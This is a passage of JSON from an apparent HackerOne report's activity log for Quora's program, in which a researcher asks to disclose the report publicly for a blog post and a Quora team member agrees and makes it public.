ssage":"Hi I'm thinking to do a blog post about this report (and the others by me), soon or later. I'd like to reference directly these Hackerone reports. Can we publicly disclosure them? We can hide some/all comments if you prefer","markdown_message":"\u003cp\u003eHi I\u0026#39;m thinking to do a blog post about this report (and the others by me), soon or later. I\u0026#39;d like to reference directly these Hackerone reports. Can we publicly disclosure them? We can hide some/all comments if you prefer\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-08T15:54:50.801Z","updated_at":"2018-03-08T15:54:50.801Z","actor":{"username":"0xnan","cleared":false,"url":"/0xnan","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2474624,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-08T18:54:18.019Z","updated_at":"2018-03-08T18:54:18.019Z","actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2474625,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-03-08T18:54:18.158Z","updated_at":"2018-03-08T18:54:18.158Z","actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2474631,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Done. Let us know if you want any details from us for the blog and please provide the link to it.","markdown_message":"\u003cp\u003eDone. Let us know if you want any details from us for the blog and please provide the link to it.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-03-08T18:55:42.686Z","updated_at":"2018-03-08T18:55:42.686Z","actor":{"username":"sriram-quora","cleared":false,"url":"/sriram-quora","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"quora","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}